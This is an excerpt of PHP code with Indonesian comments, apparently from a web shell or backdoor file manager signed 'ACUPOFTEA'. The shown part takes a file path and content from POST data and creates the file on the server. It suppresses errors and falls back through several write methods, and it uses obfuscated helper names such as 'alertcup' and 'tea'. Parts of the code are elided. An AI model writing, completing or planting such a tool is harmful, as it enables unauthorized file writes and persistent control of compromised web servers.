...
if (isset($_POST['nfn'])) {
    try {
        ...
        if (!file_exists($nfp)) {
            if (isset($_POST['nfc']) && trim($_POST['nfc']) !== '') {
                $nfc = $_POST['nfc'];
                ...
                // Konten default untuk memastikan file tidak 0 byte
                $defaultContent = "<?php\n// File created by ACUPOFTEA\n// Timestamp: " . date('Y-m-d H:i:s') . "\n?>";
                
                // Coba berbagai metode penulisan untuk kompatibilitas lintas versi PHP
                $success = false;
                
                // Method 1: file_put_contents (PHP 5+)
                if (@file_put_contents($nfp, $defaultContent) !== false) {
                    $success = true;
                } 
                // Method 2: fwrite (PHP 4+)
                else if ($handle = @fopen($nfp, 'w')) {
                    if (@fwrite($handle, $defaultContent) !== false) {
                        $success = true;
                    }
                    @fclose($handle);
                }
                // Method 3: touch + append (fallback)
                else if (@touch($nfp)) {
                    if (@file_put_contents($nfp, $defaultContent, FILE_APPEND | LOCK_EX) !== false) {
                        $success = true;
                    }
                }
                ...
                if ($success) {
                    ...
                    clearstatcache(true, $nfp);
                    $fileSize = @filesize($nfp);
                    
                    if ($fileSize > 0) {
                        $sizeMsg = $fileSize ? " ($fileSize bytes)" : "";
                        alertcup("Success make a file $nfn{$sizeMsg}.", "#14A44D", "?cup=" . tea($cup));
                    } else {
                        // Force non-zero dengan menambahkan konten lagi
                        @file_put_contents($nfp, "\n", FILE_APPEND);
                        alertcup("Success make a file $nfn.", "#14A44D", "?cup=" . tea($cup));
                    }
                } else {
                    throw new Exception("Failed to create file $nfn. Check permissions.");
                }
            }
        } else {
